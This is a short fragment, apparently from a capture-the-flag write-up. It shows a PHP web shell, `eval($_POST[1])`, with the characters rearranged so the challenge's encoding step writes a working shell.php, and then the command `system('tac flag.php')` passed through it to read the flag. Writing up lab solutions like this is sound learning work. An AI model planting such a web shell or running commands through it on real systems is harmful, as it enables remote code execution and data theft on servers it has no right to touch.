...
3. At the same time, our `$file` can be decoded into a clear command: `<?php eval($_POST[1]);?>`
...
- `shell.php` should be:
	- From `<?php eval($_POST[1]);?>`
	- To `?<hp pvela$(P_SO[T]1;)>?`
	- so the `contents` should be `?<hp pvela$(P_SO[T]1;)>?`
- The `1` should be: `system('tac flag.php');`
## 5. Get a conclusion